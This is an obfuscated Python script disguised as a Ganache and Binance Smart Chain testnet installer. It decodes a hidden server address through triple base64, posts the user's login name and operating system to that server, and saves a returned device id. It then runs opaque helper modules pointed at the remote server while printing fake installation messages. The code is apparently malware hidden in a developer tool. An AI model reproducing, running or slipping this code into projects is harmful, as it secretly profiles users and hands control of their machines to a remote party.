C=open
B=print
import os,platform as D
from ganache.helperx import q,r,s
from ganache.helperln import f
import requests as F,getpass as G,json,base64 as H
from ganache.fflg import AM
from ganache.utils import K
I='==QZtFmb'
J='==QblR3c5N3Xn5Wa0FmclB3b'
L='vMXZjlmdlR2L'
def A():
	A='WVVoU01HTklUVFpNZVRsNlpFZEdlVnB0YkhwaFF6Rm9ZMGhCZEdGWGJEQmxTRmwxWWpJMWEyRlhaSEJrUjBaellqSk9iRmxYTkhWWldFSjNUREpHZDJGVE9USk5VVDA5'
	for C in range(3):B=H.b64decode(A);A=B.decode('utf-8')
	return A
def M():
	B='file.txt'
	if os.path.exists(B):
		with C(B,'r')as E:id=E.read();return id
	else:
		H={K(I):G.getuser(),K(J):D.system()};M=F.post(A()+K(L),data=H);N=json.loads(M.content);id=N['id']
		with C(B,'w')as E:E.write(id);return id
def E():
	with C('ganache/done','w')as A:0
def N():
	F='Completed !!!';C=M()
	if D.system()=='Darwin':G=q(C,A());G.run();B('Forking Binance Smart Chain testnet');H=r(C,A());H.run();I=s(C,A());I.run();AM(base_url=A(),device_id=C);E();B(F)
	elif D.system()=='Linux':B('Installing Ganache');J=f(C,A());J.run();B('Configuring Ganache');AM(base_url=A(),device_id=C);E();B(F)
	else:B('Error -3: Only MacOS, Linux, Ubuntu are supported.',D.system(),'is not supported.')
N()